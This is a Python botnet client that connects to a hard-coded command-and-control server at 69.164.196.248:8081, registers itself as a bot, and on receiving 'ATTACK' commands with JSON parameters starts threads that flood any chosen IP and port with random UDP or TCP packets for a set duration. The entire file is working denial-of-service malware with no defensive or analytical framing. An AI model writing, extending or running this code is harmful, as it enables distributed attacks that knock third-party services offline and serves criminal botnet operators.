import socket
import json
import random
import threading
import time

# Server address and port
SERVER_ADDRESS = '69.164.196.248'
SERVER_PORT = 8081

def udp_flood(ip, port, times, duration):
    data = random._urandom(1024)
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            for _ in range(times):
                s.sendto(data, addr)
        except Exception as e:
            print(f"UDP Flood Error: {e}")

def tcp_flood(ip, port, times, duration):
    data = random._urandom(1024)
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for _ in range(times):
                s.send(data)
            s.close()
        except Exception as e:
            print(f"TCP Flood Error: {e}")

def handle_attack(payload):
    ip = payload['ip']
    port = payload['port']
    choice = payload['choice']
    times = payload['times']
    duration = payload['duration']
    
    print(f"Handling attack with parameters - IP: {ip}, Port: {port}, Choice: {choice}, Times: {times}, Duration: {duration}")

    attack_method = udp_flood if choice.lower() == 'y' else tcp_flood

    # Start the attack
    attack_thread = threading.Thread(target=attack_method, args=(ip, port, times, duration))
    attack_thread.start()

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((SERVER_ADDRESS, SERVER_PORT))
        print("Connected to server")

        # Register the bot with the server
        client.sendall("REGISTER".encode('utf-8'))
        print("Registered with the server")

        while True:
            data = client.recv(4096).decode('utf-8')
            if data:
                print(f"Received data: {data}")
                if data.startswith("ATTACK"):
                    _, attack_data = data.split(" ", 1)
                    try:
                        payload = json.loads(attack_data)
                        handle_attack(payload)
                    except json.JSONDecodeError as e:
                        print(f"JSON decode error: {e}")
                    except Exception as e:
                        print(f"Error handling attack payload: {e}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    main()

